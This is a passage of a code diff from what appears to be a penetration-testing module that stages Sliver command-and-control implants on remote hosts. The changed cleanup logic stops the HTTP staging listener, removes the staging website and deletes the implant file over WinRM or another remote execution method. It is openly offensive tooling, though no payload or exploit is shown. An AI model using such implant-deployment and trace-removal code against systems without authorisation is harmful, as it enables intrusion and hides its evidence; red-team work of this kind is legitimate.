-                    connection.execute(cleanup_cmd, methods=[method])
-                context.log.info("Cleaned up remote implant")
-            except Exception as e:
-                context.log.warning(f"Cleanup failed: {e}")
-        elif cleanup:
-            context.log.info("Cleanup skipped (staging: in-memory)")
+        if cleanup:
+            # Cleanup HTTP staging resources (listener + website)
+            if listener_job_id:
+                try:
+                    context.log.display(f"Stopping HTTP listener (Job ID: {listener_job_id})...")
+                    self._worker_submit('kill_job', listener_job_id)
+                    context.log.info("HTTP listener stopped")
+                except Exception as e:
+                    context.log.warning(f"Failed to stop HTTP listener: {e}")
+            
+            if website_name:
+                try:
+                    context.log.display(f"Removing Sliver website '{website_name}'...")
+                    self._worker_submit('website_remove', website_name)
+                    context.log.info("Sliver website removed")
+                except Exception as e:
+                    context.log.warning(f"Failed to remove website: {e}")
+            
+            # Cleanup remote implant file (for non-staging or file-based staging)
+            if full_remote_path:
+                cleanup_cmd = handler.get_cleanup_cmd(full_remote_path, os_type)
+                method = self._get_exec_method(protocol)
+                try:
+                    if protocol == "winrm":
+                        result = connection.ps_execute(cleanup_cmd, get_output=True)
+                        if result and result.strip():
+                            context.log.debug(f"PowerShell cleanup output: {result}")
+                    else:
+                        connection.execute(cleanup_cmd, methods=[method])
+                    context.log.info("Cleaned up remote implant")
+                except Exception as e:
+                    context.log.warning(f"Cleanup failed: {e}")
+            elif not listener_job_id and not website_name:
+                context.log.info("Cleanup skipped (staging: in-memory)")
 
     def _wait_for_beacon(self, context, implant_name, timeout=30):
         """
